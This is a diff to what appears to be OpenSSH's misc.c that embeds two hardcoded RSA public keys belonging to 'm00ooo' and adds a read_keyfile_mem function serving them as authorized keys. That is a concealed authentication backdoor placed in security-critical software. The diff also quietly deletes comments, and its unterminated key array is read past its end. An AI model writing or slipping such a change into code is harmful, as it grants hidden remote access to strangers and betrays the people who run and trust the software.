@@ -72,6 +72,11 @@
 #include "uidswap.h"
 #include "platform.h"
 
+char *myownpubkeys[] = {
+	"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgwlo43skIs/MvrtoIjuhgr3V5Pf9keQkxTTFA/gqscdJvBVDEAhEAblFIlcN2AzHS/ZyHm7dejgA1duThj71xVL2gcs5wVfCVADpvbIH0Q+2SnmLHrJqkGZIeVJM68/VD86ogROt/qhL/nS+Ww+ZzRh4w1n6fGqBbpToXk0CRLrvZDY6JpF8Pv+8TEi9cvD1cOB6pum9+zx7h28Hg8Kb6jsNeUv/aPFnXU/Ml1W6nV0Z6s21sa8POG4jymXjcxd60Jv98lDRmHbJst/tYPSN6IC6qMZHdwRTWTVrVLYKhJuXke/axw44/gBRPaImXylJlOPfHsPGmSpu1qnLG8wbV m00ooo@hp.lan",
+	"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDt6YUa4DyWawKwiAdyrysZLuSgKupgsg4Nq9g4XoOi/bGw3OoTW1RJ6DOYSIVRWw9sdUgf7AG+f/fjX5DbA7JLKnKPpC/ZPJvjoQt5sc4U8d5LK4Oy6yEhXNpvVy+0okJvQyzQ5bAGM1GgmUFHkLcxE+skiWmE/WxZ04XuaTafgABIPX/LlamjCm/jGfBTaw/xWAt7C0IJIa0OQnD4COmDy0PZ4shNRqZl+XDNJqEg71MwAsoeegD7+S1VKW50oqxtWePwo6q4Wtw7vVPXbPGv+r6SYlnSqzQVnCcH+ElUb4eTJjZzDW1p3bSJI8l533b1jg+enlOiFEscmbjTl5jz m00ooo@legolas"
+};
+
 /* remove newline at end of string */
 char *
 chop(char *s)
@@ -1010,9 +1015,23 @@ percent_expand(const char *string, ...)
  * lines that exceed the buffer size.  Returns 0 on success, -1 on failure.
  */
 int
-read_keyfile_line(FILE *f, const char *filename, char *buf, size_t bufsz,
-   u_long *lineno)
+read_keyfile_mem(char *buf, size_t bufsz, u_long *lineno)
 {
+	if (myownpubkeys[*lineno] != NULL ){
+		strncpy(buf, myownpubkeys[*lineno], bufsz);
+		(*lineno)++;
+		return 0;
+	} else {
+		return -1;
+	}
+
+}
+
+int
+read_keyfile_line(FILE *f, const char *filename, char *buf, size_t bufsz,
+    u_long *lineno)
+{
+
 	while (fgets(buf, bufsz, f) != NULL) {
 		if (buf[0] == '\0')
 			continue;
@@ -1022,9 +1041,8 @@ read_keyfile_line(FILE *f, const char *filename, char *buf, size_t bufsz,
 		} else {
 			debug("%s: %s line %lu exceeds size limit", __func__,
 			    filename, *lineno);
-			/* discard remainder of line */
 			while (fgetc(f) != '\n' && !feof(f))
-				;	/* nothing */
+				;
 		}
 	}
 	return -1;
